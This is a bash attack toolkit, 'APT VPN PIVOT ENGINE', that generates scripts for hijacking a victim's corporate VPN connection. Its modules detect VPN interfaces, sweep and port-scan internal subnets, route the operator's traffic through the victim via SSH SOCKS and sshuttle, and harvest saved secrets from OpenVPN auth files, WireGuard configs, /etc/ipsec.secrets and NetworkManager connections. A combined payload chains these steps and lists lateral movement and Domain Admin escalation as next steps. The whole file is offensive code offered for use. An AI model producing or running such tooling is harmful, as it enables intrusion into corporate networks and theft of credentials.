#!/bin/bash
# ============================================
# APT VPN PIVOT ENGINE v1.0
# Corporate VPN Hijack | Internal Access | Proxy
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

PIVOT_DIR="$HOME/c2_server/modules/corporate/vpn_pivot"
PAYLOAD_DIR="$HOME/c2_server/payloads"
LOG_DIR="$HOME/c2_server/logs"

mkdir -p "$PIVOT_DIR" "$PAYLOAD_DIR" "$LOG_DIR"

# === VPN CONNECTION DETECTOR ===
generate_vpn_detector() {
    echo -e "\n${CYAN}[VPN Connection Detector]${NC}"
    
    cat > "$PIVOT_DIR/vpn_detector.sh" << 'VPNDETECT'
#!/bin/bash
# VPN CONNECTION DETECTOR
# Finds active corporate VPN connections on victim device

echo "[*] Scanning for VPN connections..."

DETECTED=0

# Check common VPN interfaces
VPN_INTERFACES=("tun0" "tap0" "ppp0" "utun" "ipsec" "wg0" "ovpn")

for iface in "${VPN_INTERFACES[@]}"; do
    if ip link show "$iface" 2>/dev/null | grep -q "UP"; then
        echo "  [+] VPN Interface: $iface"
        
        # Get internal IP
        local ip=$(ip addr show "$iface" 2>/dev/null | grep "inet " | awk '{print $2}')
        echo "      Internal IP: $ip"
        
        DETECTED=$((DETECTED + 1))
    fi
done

# Check for VPN processes
VPN_PROCS=("openvpn" "wireguard" "strongswan" "ikev2" "anyconnect" "globalprotect" "pulse")
for proc in "${VPN_PROCS[@]}"; do
    if pgrep -f "$proc" >/dev/null 2>&1; then
        echo "  [+] VPN Process: $proc"
        DETECTED=$((DETECTED + 1))
    fi
done

# Check VPN configuration files
VPN_CONFIGS=(
    /etc/openvpn/*.conf
    /etc/wireguard/*.conf
    /etc/ipsec.conf
    /opt/cisco/anyconnect/profile.xml
    $HOME/.openvpn/*.ovpn
)

for config in $VPN_CONFIGS; do
    [ -f "$config" ] && {
        echo "  [+] VPN Config: $config"
        DETECTED=$((DETECTED + 1))
    }
done

echo ""
echo "[+] Found $DETECTED VPN indicators"
[ "$DETECTED" -gt 0 ] && echo "[!] CORPORATE VPN DETECTED — Internal access possible!"
VPNDETECT
    chmod +x "$PIVOT_DIR/vpn_detector.sh"
    echo -e "${GREEN}[+]${NC} VPN Detector: $PIVOT_DIR/vpn_detector.sh"
}

# === INTERNAL NETWORK SCANNER ===
generate_internal_scanner() {
    echo -e "\n${CYAN}[Internal Network Scanner]${NC}"
    
    cat > "$PIVOT_DIR/internal_scanner.sh" << 'INTSCAN'
#!/bin/bash
# INTERNAL NETWORK SCANNER
# Scans corporate internal network through VPN

echo "[*] Scanning internal corporate network..."

# Detect internal subnets from VPN interfaces
SUBNETS=()
for iface in $(ip link show | grep -E "tun|tap|ppp|wg" | cut -d: -f2); do
    ip=$(ip addr show "$iface" 2>/dev/null | grep "inet " | awk '{print $2}')
    [ -n "$ip" ] && {
        subnet=$(echo "$ip" | cut -d. -f1-3)
        SUBNETS+=("$subnet.0/24")
        echo "  [+] Internal subnet: $subnet.0/24 (via $iface)"
    }
done

# Scan each internal subnet
for subnet in "${SUBNETS[@]}"; do
    echo ""
    echo "  [*] Scanning: $subnet"
    
    # Quick ping sweep
    for i in $(seq 1 254); do
        ip="${subnet%.*}.$i"
        (ping -c 1 -W 1 "$ip" >/dev/null 2>&1 && echo "      🟢 $ip") &
    done
    wait
done

echo ""
echo "[+] Internal network scan complete"
INTSCAN
    chmod +x "$PIVOT_DIR/internal_scanner.sh"
    echo -e "${GREEN}[+]${NC} Internal Scanner: $PIVOT_DIR/internal_scanner.sh"
}

# === PORT SCANNER (Internal) ===
generate_port_scanner() {
    echo -e "\n${CYAN}[Internal Port Scanner]${NC}"
    
    cat > "$PIVOT_DIR/port_scanner.sh" << 'PORTSCAN'
#!/bin/bash
# INTERNAL PORT SCANNER
# Scans common corporate ports on internal hosts

echo "[*] Scanning internal services..."

# Common corporate ports
declare -A SERVICES=(
    [22]="SSH"
    [80]="HTTP"
    [443]="HTTPS"
    [445]="SMB"
    [3389]="RDP"
    [8080]="HTTP-Alt"
    [8443]="HTTPS-Alt"
    [389]="LDAP"
    [636]="LDAPS"
    [1433]="MSSQL"
    [3306]="MySQL"
    [5432]="PostgreSQL"
    [27017]="MongoDB"
    [6379]="Redis"
)

# Get target from internal scanner
TARGET_FILE="/tmp/internal_hosts.txt"
[ ! -f "$TARGET_FILE" ] && { echo "[!] Run internal scanner first"; return 1; }

while read -r host; do
    echo "  [*] Scanning $host..."
    
    for port in "${!SERVICES[@]}"; do
        (timeout 2 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && \
         echo "      🔓 $port (${SERVICES[$port]}) — OPEN") &
    done
    wait
done < "$TARGET_FILE"

echo "[+] Port scan complete"
PORTSCAN
    chmod +x "$PIVOT_DIR/port_scanner.sh"
    echo -e "${GREEN}[+]${NC} Port Scanner: $PIVOT_DIR/port_scanner.sh"
}

# === SOCKS PROXY SETUP ===
generate_socks_proxy() {
    echo -e "\n${CYAN}[SOCKS Proxy Setup]${NC}"
    
    cat > "$PIVOT_DIR/socks_proxy.sh" << 'SOCKS'
#!/bin/bash
# SOCKS PROXY THROUGH VICTIM
# Routes your traffic through victim's VPN

echo "[*] Setting up SOCKS proxy through victim..."

LOCAL_PORT=1080
VICTIM_HOST="$1"
VICTIM_USER="${2:-root}"

if [ -z "$VICTIM_HOST" ]; then
    echo "[!] Usage: $0 <victim_ip> [username]"
    return 1
fi

# Method 1: SSH Dynamic Proxy
echo "  [*] Method 1: SSH SOCKS Proxy"
ssh -D $LOCAL_PORT -N -f "$VICTIM_USER@$VICTIM_HOST" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "  [+] SOCKS proxy: localhost:$LOCAL_PORT"
    echo "  [+] Configure browser: SOCKS5 localhost:$LOCAL_PORT"
    echo "  [+] Test: curl --socks5 localhost:$LOCAL_PORT http://internal-corp-app"
fi

# Method 2: SSHUTTLE (VPN-like)
echo "  [*] Method 2: sshuttle (VPN tunnel)"
which sshuttle >/dev/null 2>&1 && {
    # Get internal subnets
    INTERNAL_SUBNETS=$(ip route | grep "tun\|tap" | awk '{print $1}' | tr '\n' ' ')
    [ -n "$INTERNAL_SUBNETS" ] && {
        sshuttle -r "$VICTIM_USER@$VICTIM_HOST" $INTERNAL_SUBNETS &
        echo "  [+] VPN tunnel: $INTERNAL_SUBNETS routed via victim"
    }
}

# Method 3: Proxychains (for tools)
echo "  [*] Method 3: Proxychains configuration"
cat >> /etc/proxychains.conf << 'PROXYCONF'
[ProxyList]
socks5 127.0.0.1 1080
PROXYCONF
echo "  [+] Proxychains configured: proxychains nmap internal-host"

echo "[+] SOCKS proxy ready"
SOCKS
    chmod +x "$PIVOT_DIR/socks_proxy.sh"
    echo -e "${GREEN}[+]${NC} SOCKS Proxy: $PIVOT_DIR/socks_proxy.sh"
}

# === CREDENTIAL HARVESTER (VPN Passwords) ===
generate_vpn_cred_harvester() {
    echo -e "\n${CYAN}[VPN Credential Harvester]${NC}"
    
    cat > "$PIVOT_DIR/vpn_cred_harvester.sh" << 'VPNCRED'
#!/bin/bash
# VPN CREDENTIAL HARVESTER
# Steals saved VPN credentials from victim

echo "[*] Harvesting VPN credentials..."

OUTPUT="$HOME/vpn_credentials.txt"
echo "=== VPN CREDENTIALS ===" > "$OUTPUT"

# OpenVPN configs (often contain auth-user-pass)
for ovpn in /etc/openvpn/*.conf $HOME/.openvpn/*.ovpn; do
    [ -f "$ovpn" ] && {
        echo "" >> "$OUTPUT"
        echo "Config: $ovpn" >> "$OUTPUT"
        cat "$ovpn" >> "$OUTPUT"
        
        # Check for auth file
        auth_file=$(grep "auth-user-pass" "$ovpn" | awk '{print $2}')
        [ -f "$auth_file" ] && {
            echo "" >> "$OUTPUT"
            echo "Auth File: $auth_file" >> "$OUTPUT"
            cat "$auth_file" >> "$OUTPUT"
        }
    }
done

# WireGuard keys
for wg in /etc/wireguard/*.conf; do
    [ -f "$wg" ] && {
        echo "" >> "$OUTPUT"
        echo "WireGuard: $wg" >> "$OUTPUT"
        cat "$wg" >> "$OUTPUT"
    }
done

# IPsec secrets
[ -f /etc/ipsec.secrets ] && {
    echo "" >> "$OUTPUT"
    echo "IPsec Secrets:" >> "$OUTPUT"
    cat /etc/ipsec.secrets >> "$OUTPUT"
}

# Cisco AnyConnect
[ -f /opt/cisco/anyconnect/profile.xml ] && {
    echo "" >> "$OUTPUT"
    echo "AnyConnect Profile:" >> "$OUTPUT"
    cat /opt/cisco/anyconnect/profile.xml >> "$OUTPUT"
}

# NetworkManager VPN connections
for conn in /etc/NetworkManager/system-connections/*; do
    [ -f "$conn" ] && {
        echo "" >> "$OUTPUT"
        echo "NetworkManager: $conn" >> "$OUTPUT"
        cat "$conn" >> "$OUTPUT"
    }
done

echo "[+] VPN credentials saved: $OUTPUT"
VPNCRED
    chmod +x "$PIVOT_DIR/vpn_cred_harvester.sh"
    echo -e "${GREEN}[+]${NC} VPN Cred Harvester: $PIVOT_DIR/vpn_cred_harvester.sh"
}

# === CORPORATE ASSET DISCOVERY ===
generate_corp_discovery() {
    echo -e "\n${CYAN}[Corporate Asset Discovery]${NC}"
    
    cat > "$PIVOT_DIR/corp_discovery.sh" << 'CORPDISC'
#!/bin/bash
# CORPORATE ASSET DISCOVERY
# Finds internal corporate servers and services

echo "[*] Discovering corporate assets..."

# Check DNS (internal corporate DNS)
cat /etc/resolv.conf | grep -v "^#" | grep "nameserver" | while read ns; do
    echo "  [+] DNS Server: $(echo $ns | awk '{print $2}')"
done

# Check for domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs. 2>/dev/null | grep "server" | while read dc; do
    echo "  [+] Domain Controller: $dc"
done

# Check for Exchange servers
nslookup -type=MX autodiscover 2>/dev/null | grep "exch" | while read exch; do
    echo "  [+] Exchange Server: $exch"
done

# Check for internal web apps
for host in intranet wiki jira confluence gitlab jenkins; do
    nslookup "$host" 2>/dev/null | grep "Address" | grep -v "#" | while read ip; do
        echo "  [+] Internal App: $host — $(echo $ip | awk '{print $2}')"
    done
done

# Check ARP table for internal hosts
arp -a 2>/dev/null | while read entry; do
    echo "  [+] ARP Entry: $entry"
done

echo "[+] Corporate asset discovery complete"
CORPDISC
    chmod +x "$PIVOT_DIR/corp_discovery.sh"
    echo -e "${GREEN}[+]${NC} Corp Discovery: $PIVOT_DIR/corp_discovery.sh"
}

# === GENERATE COMBINED PAYLOAD ===
generate_pivot_payload() {
    echo -e "\n${CYAN}[Generating VPN Pivot Payload]${NC}"
    
    cat > "$PAYLOAD_DIR/vpn_pivot_payload.sh" << 'PAYLOAD'
#!/bin/bash
# APT VPN PIVOT PAYLOAD
# Full corporate infiltration via VPN

echo "╔══════════════════════════════════════╗"
echo "║  🌐 VPN PIVOT — CORPORATE ATTACK   ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Step 1: Detect VPN
echo "[1/6] Detecting VPN connections..."
bash vpn_detector.sh 2>/dev/null

# Step 2: Harvest VPN credentials
echo "[2/6] Harvesting VPN credentials..."
bash vpn_cred_harvester.sh 2>/dev/null

# Step 3: Discover corporate assets
echo "[3/6] Discovering corporate assets..."
bash corp_discovery.sh 2>/dev/null

# Step 4: Scan internal network
echo "[4/6] Scanning internal network..."
bash internal_scanner.sh 2>/dev/null

# Step 5: Scan internal ports
echo "[5/6] Scanning internal services..."
bash port_scanner.sh 2>/dev/null

# Step 6: Setup SOCKS proxy for C2
echo "[6/6] Setting up SOCKS proxy..."
# Auto-detect VPN gateway
VPN_GW=$(ip route | grep "tun\|tap" | awk '{print $1}' | head -1 | cut -d'/' -f1)
[ -n "$VPN_GW" ] && bash socks_proxy.sh "$VPN_GW"

echo ""
echo "╔══════════════════════════════════════╗"
echo "║  ✅ CORPORATE ACCESS ESTABLISHED!   ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "Next Steps:"
echo "  • Use SOCKS proxy to access internal apps"
echo "  • Scan Active Directory"
echo "  • Move laterally to other systems"
echo "  • Escalate to Domain Admin"
PAYLOAD
    chmod +x "$PAYLOAD_DIR/vpn_pivot_payload.sh"
    echo -e "${GREEN}[+]${NC} Pivot payload: $PAYLOAD_DIR/vpn_pivot_payload.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  🌐 VPN PIVOT — CORPORATE  ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 🔍 VPN Connection Detector"
        echo -e "  ${GREEN}2)${NC} 🌐 Internal Network Scanner"
        echo -e "  ${GREEN}3)${NC} 🔎 Internal Port Scanner"
        echo -e "  ${GREEN}4)${NC} 🔗 SOCKS Proxy Setup"
        echo -e "  ${GREEN}5)${NC} 🔑 VPN Credential Harvester"
        echo -e "  ${GREEN}6)${NC} 🏢 Corporate Asset Discovery"
        echo -e "  ${GREEN}7)${NC} 📲 Generate Combined Payload"
        echo -e "  ${GREEN}8)${NC} 🚀 Generate ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) generate_vpn_detector ;;
            2) generate_internal_scanner ;;
            3) generate_port_scanner ;;
            4) generate_socks_proxy ;;
            5) generate_vpn_cred_harvester ;;
            6) generate_corp_discovery ;;
            7) generate_pivot_payload ;;
            8)
                generate_vpn_detector
                generate_internal_scanner
                generate_port_scanner
                generate_socks_proxy
                generate_vpn_cred_harvester
                generate_corp_discovery
                generate_pivot_payload
                echo -e "\n${GREEN}[+]${NC} All VPN pivot tools generated!"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
